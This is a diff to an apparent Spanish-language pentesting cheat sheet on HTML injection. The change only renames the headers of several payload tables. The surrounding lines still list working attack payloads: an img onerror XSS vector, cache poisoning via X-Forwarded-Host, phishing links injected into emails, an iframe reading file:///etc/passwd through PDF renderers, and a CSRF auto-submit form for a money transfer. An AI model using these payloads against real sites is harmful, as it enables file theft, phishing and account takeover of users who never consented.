@@ -25,7 +25,7 @@ linked:
 
 ## HTML to XSS Upgrade
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | If filter blocks `<script>` but allows `<img>`, atacante busca event handlers en allowed tags | Privesc HTML to XSS. |
 | Image onerror | `<img src=x onerror=alert(1)>` | If onerror not filtered. |
@@ -48,7 +48,7 @@ ___
 
 ## Cache Poisoning Combo
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | HTML injection en field unkeyed (header reflejado) → cached response → todos los users see injection | Mass impact. |
 | Reflected via `X-Forwarded-Host` | App reflects header value en `<base href>` o canonical | Atacante poisons. |
@@ -66,7 +66,7 @@ ___
 
 ## HTML Email Injection
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App sends emails con user input embedded en HTML body. No sanitization → email phishing. | Spear phishing vector. |
 | Welcome email | `<a href="https://attacker">Confirm</a>` en welcome email | Trust transfer. |
@@ -87,7 +87,7 @@ ___
 
 ## PDF / Print Template Injection
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App generates PDF / print view from user content via wkhtmltopdf, Chromium headless, etc. HTML inject → PDF render con malicious content. | Server-side render. |
 | File read via `<iframe>` | `<iframe src="file:///etc/passwd">` | wkhtmltopdf reads file system. |
@@ -122,7 +122,7 @@ ___
 
 ## CSRF + HTML Injection Chain
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | HTML inject en authenticated context → form auto-submit con CSRF action | High impact ATO. |
 | Auto-submit form en stored injection | `<form id="x" action="legit/transfer"><input name="to" value="attacker"></form><script>document.getElementById('x').submit()</script>` | Direct CSRF. |
